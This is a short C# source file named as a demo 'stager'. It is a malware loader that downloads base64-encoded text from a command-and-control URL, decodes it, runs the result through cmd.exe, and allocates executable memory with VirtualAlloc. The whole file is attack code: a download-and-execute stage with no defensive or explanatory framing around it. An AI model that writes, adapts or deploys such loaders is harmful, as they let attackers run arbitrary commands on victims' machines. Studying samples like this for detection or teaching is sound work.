using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
namespace Demo.Stager {
  public class Native { [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a, UIntPtr s, uint t, uint p); }
  public class Loader {
    const string Url = "https://c2.example.invalid/stage2";
    public static string Decode(string s) => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(s));
    public static void Main(string[] args) {
      var client = new HttpClient();
      var data = client.GetStringAsync(Url).Result;
      Process.Start("cmd.exe", "/c " + Decode(data));
      Native.VirtualAlloc(IntPtr.Zero, (UIntPtr)4096, 0x3000, 0x40);
    }
  }
}
